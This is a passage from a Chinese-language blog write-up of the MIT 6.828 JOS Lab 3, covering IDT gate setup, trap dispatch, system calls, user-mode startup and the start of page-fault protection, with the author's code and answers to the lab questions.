*/</span><br><br>_alltraps:<br>pushl %ds<br>pushl %es<br>pushal<br>push $GD_KD<br>popl %ds<br>push $GD_KD<br>popl %es<br>pushl %esp<br>call trap<br></code></pre></td></tr></table></figure><p>最后使用 <code>SETGATE</code> 宏在 <code>trap_init()</code> 中装载中断描述符，其接收的第一个参数是一个 <code>Gatedesc</code> 类型结构体，用来表示一个门描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Gate descriptors for interrupts and traps</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Gatedesc</span> &#123;</span><br><span class="hljs-type">unsigned</span> gd_off_15_0 : <span class="hljs-number">16</span>;   <span class="hljs-comment">// low 16 bits of offset in segment</span><br><span class="hljs-type">unsigned</span> gd_sel : <span class="hljs-number">16</span>;        <span class="hljs-comment">// segment selector</span><br><span class="hljs-type">unsigned</span> gd_args : <span class="hljs-number">5</span>;        <span class="hljs-comment">// # args, 0 for interrupt/trap gates</span><br><span class="hljs-type">unsigned</span> gd_rsv1 : <span class="hljs-number">3</span>;        <span class="hljs-comment">// reserved(should be zero I guess)</span><br><span class="hljs-type">unsigned</span> gd_type : <span class="hljs-number">4</span>;        <span class="hljs-comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span><br><span class="hljs-type">unsigned</span> gd_s : <span class="hljs-number">1</span>;           <span class="hljs-comment">// must be 0 (system)</span><br><span class="hljs-type">unsigned</span> gd_dpl : <span class="hljs-number">2</span>;         <span class="hljs-comment">// descriptor(meaning new) privilege level</span><br><span class="hljs-type">unsigned</span> gd_p : <span class="hljs-number">1</span>;           <span class="hljs-comment">// Present</span><br><span class="hljs-type">unsigned</span> gd_off_31_16 : <span class="hljs-number">16</span>;  <span class="hljs-comment">// high bits of offset in segment</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>这里因为<strong>我们还没有定义任何处理函数所以直接声明新的函数即可</strong>，现在还没有出现陷阱所以都是普通的中断，这里注意系统调用与调试中断的特权级应设为3，因为用户进程需要能够访问其入口点：</p><blockquote><p>一开始笔者在想，好像还没有函数定义啊，后面看了一眼别人的实验报告，直接声明新的函数，还没有函数体，属实佩服…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">trap_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-keyword">extern</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Segdesc</span> <span class="hljs-title">gdt</span>[];</span><br><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// declaration</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">int0</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int1</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int2</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int3</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int4</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int5</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int6</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int7</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int8</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">int10</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int11</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int12</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int13</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">int14</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">int16</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> __syscall()<br>&#123;<br>cprintf(<span class="hljs-string">&quot;syscall!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// set up IDT</span><br>SETGATE(idt[T_DIVIDE], <span class="hljs-number">0</span>, GD_KT, int0, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_DEBUG], <span class="hljs-number">0</span>, GD_KT, int1, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_NMI], <span class="hljs-number">0</span>, GD_KT, int2, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_BRKPT], <span class="hljs-number">0</span>, GD_KT, int3, <span class="hljs-number">3</span>);<br>SETGATE(idt[T_OFLOW], <span class="hljs-number">0</span>, GD_KT, int4, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_BOUND], <span class="hljs-number">0</span>, GD_KT, int5, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_ILLOP], <span class="hljs-number">0</span>, GD_KT, int6, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_DEVICE], <span class="hljs-number">0</span>, GD_KT, int7, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_DBLFLT], <span class="hljs-number">0</span>, GD_KT, int8, <span class="hljs-number">0</span>);<br><br>SETGATE(idt[T_TSS], <span class="hljs-number">0</span>, GD_KT, int10, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_SEGNP], <span class="hljs-number">0</span>, GD_KT, int11, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_STACK], <span class="hljs-number">0</span>, GD_KT, int12, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_GPFLT], <span class="hljs-number">0</span>, GD_KT, int13, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_PGFLT], <span class="hljs-number">0</span>, GD_KT, int14, <span class="hljs-number">0</span>);<br><br>SETGATE(idt[T_FPERR], <span class="hljs-number">0</span>, GD_KT, int16, <span class="hljs-number">0</span>);<br>SETGATE(idt[T_SYSCALL], <span class="hljs-number">0</span>, GD_KT, __syscall, <span class="hljs-number">3</span>);<br><br><span class="hljs-comment">// Per-CPU setup </span><br>trap_init_percpu();<br>&#125;<br></code></pre></td></tr></table></figure><p>这里笔者将 syscall 定义为一个打印函数，运行效果如下，成功通过中断门完成了系统调用：</p><p><img src="https://s2.loli.net/2022/03/17/O9Y6lED152vKHIZ.png" alt="image.png"></p><p>当然，后面 panic 掉了，因为我们的中断处理程序没有完成</p><blockquote><p>这个时候运行评分程序应当有 30 分</p></blockquote><p>接下来看一下 Challenge，让我们自动化生成一个 table：</p><blockquote><p><em>Challenge!</em> You probably have a lot of very similar code right now, between the lists of <code>TRAPHANDLER</code> in <code>trapentry.S</code> and their installations in <code>trap.c</code>. Clean this up. Change the macros in <code>trapentry.S</code> to automatically generate a table for <code>trap.c</code> to use. Note that you can switch between laying down code and data in the assembler by using the directives <code>.text</code> and <code>.data</code>.</p></blockquote><p><s>不会做，摸了</s></p><p>最后是习题 Time：</p><blockquote><p><strong>Questions</strong></p><p>Answer the following questions in your <code>answers-lab3.txt</code>:</p><ol><li><p>What is the purpose of having an individual handler function for each exception/interrupt? (i.e., if all exceptions/interrupts were delivered to the same handler, what feature that exists in the current implementation could not be provided?)</p><p>笔者只能想到是为了降低代码的耦合性，因为其实并非是不能全部通过同一函数实现中断处理，只不过是把各个中断处理程序塞到中断入口点里罢了</p></li><li><p>Did you have to do anything to make the <code>user/softint</code> program behave correctly? The grade script expects it to produce a general protection fault (trap 13), but <code>softint</code>’s code says <code>int $14</code>. <em>Why</em> should this produce interrupt vector 13? What happens if the kernel actually allows <code>softint</code>’s <code>int $14</code> instruction to invoke the kernel’s page fault handler (which is interrupt vector 14)?</p><p>因为 General Protection Fault 属于 0 特权级，用户态无权限触发，因此在访问其向量时会触发 Page Fault</p></li></ol></blockquote><p>接下来进入 Part B，继续完善我们的中断处理程序</p><h2 id="Part-B-Page-Faults-Breakpoints-Exceptions-and-System-Calls">Part B: Page Faults, Breakpoints Exceptions, and System Calls</h2><p>本节中我们将改进中断处理代码以实现一些需要通过异常处理实现的重要的原语</p><h3 id="Handling-Page-Faults">Handling Page Faults</h3><p>缺页异常是一个十分重要的机制，出于性能的考虑，我们并不需要在一开始就为对应线性地址分配物理页，而可以在访问到他们时触发缺页异常后再分配物理页（例如 mmap 映射区域）</p><p>当触发缺页异常时，处理器会将造成缺页异常的线性地址存放在 cr2 寄存器中，JOS 提供了一个缺页异常处理函数 <code>page_fault_handler()</code>，在接下来的 Exercise 5 中我们需要修改 <code>trap_dispatch()</code> 以处理缺页异常</p><blockquote><p><strong>Exercise 5.</strong> Modify <code>trap_dispatch()</code> to dispatch page fault exceptions to <code>page_fault_handler()</code>. You should now be able to get make grade to succeed on the <code>faultread</code>, <code>faultreadkernel</code>, <code>faultwrite</code>, and <code>faultwritekernel</code> tests. If any of them don’t work, figure out why and fix them. Remember that you can boot JOS into a particular user program using make run-<em>x</em> or make run-<em>x</em>-nox. For instance, make run-hello-nox runs the <em>hello</em> user program.</p></blockquote><p>笔者直接用一个大的 switch 进行操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">trap_dispatch</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Trapframe *tf)</span><br>&#123;<br><span class="hljs-comment">// Handle processor exceptions.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-keyword">switch</span>(tf-&gt;tf_trapno)<br>&#123;<br><span class="hljs-keyword">case</span> T_DIVIDE:<br><span class="hljs-keyword">case</span> T_DEBUG:<br><span class="hljs-keyword">case</span> T_NMI:<br><span class="hljs-keyword">case</span> T_BRKPT:<br><span class="hljs-keyword">case</span> T_OFLOW:<br><span class="hljs-keyword">case</span> T_BOUND:<br><span class="hljs-keyword">case</span> T_ILLOP:<br><span class="hljs-keyword">case</span> T_DEVICE:<br><span class="hljs-keyword">case</span> T_DBLFLT:<br><span class="hljs-keyword">case</span> T_TSS:<br><span class="hljs-keyword">case</span> T_SEGNP:<br><span class="hljs-keyword">case</span> T_STACK:<br><span class="hljs-keyword">case</span> T_GPFLT:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> T_PGFLT:<br>page_fault_handler(tf);<br><span class="hljs-keyword">return</span> ;<br><span class="hljs-keyword">case</span> T_FPERR:<br><span class="hljs-keyword">case</span> T_ALIGN:<br><span class="hljs-keyword">case</span> T_MCHK:<br><span class="hljs-keyword">case</span> T_SIMDERR:<br><span class="hljs-keyword">case</span> T_SYSCALL:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-comment">// Unexpected trap: The user process or the kernel has a bug.</span><br>print_trapframe(tf);<br><span class="hljs-keyword">if</span> (tf-&gt;tf_cs == GD_KT)<br>panic(<span class="hljs-string">&quot;unhandled trap in kernel&quot;</span>);<br><span class="hljs-keyword">else</span> &#123;<br>env_destroy(curenv);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行评分程序，成功通过缺页异常部分：</p><p><img src="https://s2.loli.net/2022/03/17/6CYuBxpQh5njEvP.png" alt="image.png"></p><h3 id="The-Breakpoint-Exception">The Breakpoint Exception</h3><p>断点异常通常被用于调试程序，调试原理是将程序中对应指令替换为 int3 软中断；在 JOS 中我们将其转化为任何用户环境都可以唤醒一个 JOS kernel monitor 的一个“伪系统调用”</p><p>接下来是 Exercise 6，补完 <code>trap_dispatch()</code> 使得断点异常能唤起一个 kernel monitor</p><blockquote><p><strong>Exercise 6.</strong> Modify <code>trap_dispatch()</code> to make breakpoint exceptions invoke the kernel monitor. You should now be able to get make grade to succeed on the <code>breakpoint</code> test.</p></blockquote><p>简单修改一下之前的大 switch 即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> T_BRKPT:<br>monitor(tf);<br><span class="hljs-keyword">return</span> ;<br></code></pre></td></tr></table></figure><p>此时应该能通过 grade 中的断点评分</p><p><img src="https://s2.loli.net/2022/03/17/sJYUfEvIPtBrdFo.png" alt="image.png"></p><p>接下来又是 Challenge，完成单步调试器：</p><blockquote><p><em>Challenge!</em> Modify the JOS kernel monitor so that you can ‘continue’ execution from the current location (e.g., after the <code>int3</code>, if the kernel monitor was invoked via the breakpoint exception), and so that you can single-step one instruction at a time. You will need to understand certain bits of the <code>EFLAGS</code> register in order to implement single-stepping.</p><p><em>Optional:</em> If you’re feeling really adventurous, find some x86 disassembler source code - e.g., by ripping it out of QEMU, or out of GNU binutils, or just write it yourself - and extend the JOS kernel monitor to be able to disassemble and display instructions as you are stepping through them. Combined with the symbol table loading from lab 1, this is the stuff of which real kernel debuggers are made.</p></blockquote><p><s>闲出屁来才有时间去做这玩意，👴忙着呢</s></p><p>之后是习题 Time：</p><blockquote><p><strong>Questions</strong></p><ol><li><p>The break point test case will either generate a break point exception or a general protection fault depending on how you initialized the break point entry in the IDT (i.e., your call to <code>SETGATE</code> from <code>trap_init</code>). Why? How do you need to set it up in order to get the breakpoint exception to work as specified above and what incorrect setup would cause it to trigger a general protection fault?</p><p>这取决于 IDT 中门描述符的特权级，若特权级为 0 ，用户进程没有权限访问对应页面，自然会触发缺页异常；若特权级为3，则自然能正常通过门描述符触发断点异常。</p></li><li><p>What do you think is the point of these mechanisms, particularly in light of what the <code>user/softint</code> test program does?</p><p>目的是不允许用户随意通过门描述符进入不该进入的处理程序中</p></li></ol></blockquote><h3 id="System-calls">System calls</h3><p>用户进程通过系统调用向内核请求资源，当用户进程进行系统调用时，处理器进入内核态，保存用户进程上下文，之后内核执行对应的系统调用代码，最后恢复回用户进程</p><p>在 JOS 中我们使用 <code>int 0x30</code> 来实现系统调用，进程通过对应的寄存器传递系统调用号（eax）与参数（edx，ecx，ebx，edi，esi），返回值存放在 rax 寄存器中</p><p>接下来是 Exercise 7，补完 JOS 的系统调用机制</p><blockquote><p><strong>Exercise 7.</strong> Add a handler in the kernel for interrupt vector <code>T_SYSCALL</code>. You will have to edit <code>kern/trapentry.S</code> and <code>kern/trap.c</code>’s <code>trap_init()</code>. You also need to change <code>trap_dispatch()</code> to handle the system call interrupt by calling <code>syscall()</code> (defined in <code>kern/syscall.c</code>) with the appropriate arguments, and then arranging for the return value to be passed back to the user process in <code>%eax</code>. Finally, you need to implement <code>syscall()</code> in <code>kern/syscall.c</code>. Make sure <code>syscall()</code> returns <code>-E_INVAL</code> if the system call number is invalid. You should read and understand <code>lib/syscall.c</code> (especially the inline assembly routine) in order to confirm your understanding of the system call interface. Handle all the system calls listed in <code>inc/syscall.h</code> by invoking the corresponding kernel function for each call.</p><p>Run the <code>user/hello</code> program under your kernel (make run-hello). It should print “<code>hello, world</code>” on the console and then cause a page fault in user mode. If this does not happen, it probably means your system call handler isn’t quite right. You should also now be able to get make grade to succeed on the <code>testbss</code> test.</p></blockquote><p>首先是在大 switch 里调用 JOS 的 syscall 接口，这里<strong>别忘了显式地将返回值给到 eax</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> T_SYSCALL:<br>tf-&gt;tf_regs.reg_eax = syscall(tf-&gt;tf_regs.reg_eax, <br>tf-&gt;tf_regs.reg_edx, tf-&gt;tf_regs.reg_ecx, <br>tf-&gt;tf_regs.reg_ebx, tf-&gt;tf_regs.reg_edi, <br>tf-&gt;tf_regs.reg_esi);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>之后修改 <code>kern/syscall.c</code> 中的 <code>syscall()</code> 函数，笔者本想选择声明一个系统调用表，在进行调用时直接查表调用即可，但是 JOS 已经写了一个 switch 在这里，那就一切从简吧（笑）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Dispatches to the correct kernel function, passing the arguments.</span><br><span class="hljs-type">int32_t</span><br><span class="hljs-title function_">syscall</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> syscallno, <span class="hljs-type">uint32_t</span> a1, <span class="hljs-type">uint32_t</span> a2, <span class="hljs-type">uint32_t</span> a3, <span class="hljs-type">uint32_t</span> a4, <span class="hljs-type">uint32_t</span> a5)</span><br>&#123;<br><span class="hljs-comment">// Call the function corresponding to the &#x27;syscallno&#x27; parameter.</span><br><span class="hljs-comment">// Return any appropriate return value.</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><br><span class="hljs-comment">// panic(&quot;syscall not implemented&quot;);</span><br><br><span class="hljs-keyword">switch</span> (syscallno) &#123;<br><span class="hljs-keyword">case</span> SYS_cputs:<br>sys_cputs((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)a1, a2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">case</span> SYS_cgetc:<br><span class="hljs-keyword">return</span> sys_cgetc();<br><span class="hljs-keyword">case</span> SYS_getenvid:<br><span class="hljs-keyword">return</span> sys_getenvid();<br><span class="hljs-keyword">case</span> SYS_env_destroy:<br><span class="hljs-keyword">return</span> sys_env_destroy(a1);<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -E_INVAL;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成之后应当能通过 grade 里的 testbss：</p><p><img src="https://s2.loli.net/2022/03/17/qseB1tyViWIrdDG.png" alt="image.png"></p><p>之后是 Challenge，修改代码使用 sysenter 与 sysexit 实现系统调用机制</p><blockquote><p><em>hallenge!</em> Implement system calls using the <code>sysenter</code> and <code>sysexit</code> instructions instead of using <code>int 0x30</code> and <code>iret</code>.</p><p>The <code>sysenter/sysexit</code> instructions were designed by Intel to be faster than <code>int/iret</code>. They do this by using registers instead of the stack and by making assumptions about how the segmentation registers are used. The exact details of these instructions can be found in Volume 2B of the Intel reference manuals.</p><p>The easiest way to add support for these instructions in JOS is to add a <code>sysenter_handler</code> in <code>kern/trapentry.S</code> that saves enough information about the user environment to return to it, sets up the kernel environment, pushes the arguments to <code>syscall()</code> and calls <code>syscall()</code> directly. Once <code>syscall()</code> returns, set everything up for and execute the <code>sysexit</code> instruction. You will also need to add code to <code>kern/init.c</code> to set up the necessary model specific registers (MSRs). Section 6.1.2 in Volume 2 of the AMD Architecture Programmer’s Manual and the reference on SYSENTER in Volume 2B of the Intel reference manuals give good descriptions of the relevant MSRs. You can find an implementation of <code>wrmsr</code> to add to <code>inc/x86.h</code> for writing to these MSRs <a href="http://ftp.kh.edu.tw/Linux/SuSE/people/garloff/linux/k6mod.c">here</a>.</p><p>Finally, <code>lib/syscall.c</code> must be changed to support making a system call with <code>sysenter</code>. Here is a possible register layout for the <code>sysenter</code> instruction:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">eax</span>                - <span class="hljs-keyword">syscall</span> number<br><span class="hljs-built_in">edx</span>, <span class="hljs-built_in">ecx</span>, <span class="hljs-built_in">ebx</span>, <span class="hljs-built_in">edi</span> - arg1, arg2, arg3, arg4<br><span class="hljs-built_in">esi</span>                - return pc<br><span class="hljs-built_in">ebp</span>                - return <span class="hljs-built_in">esp</span><br><span class="hljs-built_in">esp</span>                - trashed by <span class="hljs-keyword">sysenter</span><br><br></code></pre></td></tr></table></figure><p>GCC’s inline assembler will automatically save registers that you tell it to load values directly into. Don’t forget to either save (push) and restore (pop) other registers that you clobber, or tell the inline assembler that you’re clobbering them. The inline assembler doesn’t support saving <code>%ebp</code>, so you will need to add code to save and restore it yourself. The return address can be put into <code>%esi</code> by using an instruction like <code>leal after_sysenter_label, %%esi</code>.</p><p>Note that this only supports 4 arguments, so you will need to leave the old method of doing system calls around to support 5 argument system calls. Furthermore, because this fast path doesn’t update the current environment’s trap frame, it won’t be suitable for some of the system calls we add in later labs.</p><p>You may have to revisit your code once we enable asynchronous interrupts in the next lab. Specifically, you’ll need to enable interrupts when returning to the user process, which <code>sysexit</code> doesn’t do for you.</p></blockquote><p><s>没那闲工夫，👴选择摸了</s></p><h3 id="User-mode-startup">User-mode startup</h3><p>用户进程的入口点在 <code>lib/entry.S</code>，其在初始化后会调用 <code>libmain()</code>，接下来我们要修改该函数：将全局变量 <code>thisenv</code> 指向当前进程的 Env 结构体</p><p><code>libmain()</code> 之后会调用 <code>umain()</code>，定义于 <code>user/hello.c</code> 中，在打印 hello world 之后其会尝试访问 <code>thisenv-&gt;env_id</code>，在之前的实验中这会触发异常，接下来我们应当初始化 <code>thisenv</code> 以让他不触发异常</p><p>于是我们来到了 Exercise 8，<strong>进入到用户态的世界</strong>（其实系统调用那里已经在用户态与内核态“来去之间”了）</p><blockquote><p><strong>Exercise 8.</strong> Add the required code to the user library, then boot your kernel. You should see <code>user/hello</code> print “<code>hello, world</code>” and then print “<code>i am environment 00001000</code>”. <code>user/hello</code> then attempts to “exit” by calling <code>sys_env_destroy()</code> (see <code>lib/libmain.c</code> and <code>lib/exit.c</code>). Since the kernel currently only supports one user environment, it should report that it has destroyed the only environment and then drop into the kernel monitor. You should be able to get make grade to succeed on the <code>hello</code> test.</p></blockquote><p>获取到进程 id 后遍历 envs 数组即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br><span class="hljs-title function_">libmain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-comment">// set thisenv to point at our Env structure in envs[].</span><br><span class="hljs-comment">// LAB 3: Your code here.</span><br><span class="hljs-type">int</span> env_id;<br><span class="hljs-type">size_t</span> i;<br><br>env_id = sys_getenvid();<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NENV; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (envs[i].env_id == env_id)<br>&#123;<br>thisenv = &amp;envs[i];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// thisenv = 0;</span><br><br><span class="hljs-comment">// save the name of the program so that panic() can use it</span><br><span class="hljs-keyword">if</span> (argc &gt; <span class="hljs-number">0</span>)<br>binaryname = argv[<span class="hljs-number">0</span>];<br><br><span class="hljs-comment">// call user main routine</span><br>umain(argc, argv);<br><br><span class="hljs-comment">// exit gracefully</span><br><span class="hljs-built_in">exit</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这时运行评分程序应当能通过 hello：</p><p><img src="https://s2.loli.net/2022/03/17/nUNeugYvxTH7p5b.png" alt="image.png"></p><h3 id="Page-faults-and-memory-protection">Page faults and memory protection</h3><p>OS 通常依赖于硬件以保护内存，当一个程序尝试访问非法地址或无权限地址时处理器会停止进程运行，并带着造成异常的指令信息陷入内核，若该异常可以被修复则内核将其修复后再让程序继续运行，否则会终止程序运行</p><p>一个可以被修复的异常的范例便是栈的增长，在初始时我们仅为用户进程栈分配了一张页，当栈突破一张页的大小时便会触发缺页异常，此时内核应当自动分配一个新的内存页到该处，并让程序继续运行</p><p>系统调用同样可以在内存保护上造成问题：大部分的系统调用接口都会让用户程序向内核传递一个指针，而内核需要解引用这些指针，这便会有两个问题“</p><ul><li>内核空间中的缺页异常比用户空间中的缺页异常要严重得多，若内核在操纵自己的数据结构时出现缺页异常，那就是 kernel bug，应当引起 kernel panic，但若这些指针来自于用户进程，则应当要标识出这缺页异常是代表用户进程的</li><li>内核有着高于用户进程的权限，因此用户程序可能会传递一个指向用户不可读写但是内核可读写的区域，这也是内核需要注意的</li></ul><p>因此接下来我们要实现一个地址检查的功能，内核需要用其来检查用户程序传入的指针是否指向用户空间，以及页表是否允许相关操作</p><p>以此，内核永远不会因为解引用用户提供的指针而造成缺页异常，若内核发生了缺页异常，则应当 panic——这就是接下来的 Exercise 9，修改 <code>kern/trap.c</code> 让内核态下发生的缺页异常造成 kernel panic</p><blockquote><p><strong>Exercise 9.</strong> Change <code>kern/trap.c</code> to panic if a page fault happens in kernel mode.</p><p>Hint: to determine whether a fault happened in user mode or in kernel mode, check the low bits of the <code>tf_cs</code>.</p><p>Read <code>user_mem_assert</code> in <code>kern/pmap.c</code> and implement <code>user_mem_check</code> in that same file.</p><p>Change <code>kern/syscall.c</code> to sanity check arguments to system calls.</p><p>Boot your kernel, running <code>user/buggyhello</code>. The environment should be destroyed, and the kernel should <em>not</em> panic. You should see:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[<span class="hljs-number">00001000</span>] user_mem_check <span class="hljs-keyword">assertion</span> failure <span class="hljs-keyword">for</span> va <span class="hljs-number">00000001</span><br>[<span class="hljs-number">00001000</span>] free env <span class="hljs-number">00001000</span><br>Destroyed the <span class="hljs-keyword">only</span> environment - <span class="hljs-keyword">nothing</span> more <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span>!<br><br></code></pre></td></tr></table></figure><p>Finally, change <code>debuginfo_eip</code> in <code>kern/kdebug.c</code> to call <code>user_mem_check</code> on <code>usd</code>, <code>stabs</code>, and <code>stabstr</code>. If you now run <code>user/breakpoint</code>, you should be able to run backtrace from the kernel monitor and see the backtrace traverse into <code>lib/libmain.c</code> before the kernel panics with a page fault. What causes this page fault? You don’t need to fix it, but you should understand why it happens.</p></blockquote><p>首先是修改缺页异常处理程序，若我们需要确定一个缺页异常发生在用户态还是内核态，只需要检查 Trapframe 中 cs 段寄存器的 RPL 位即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 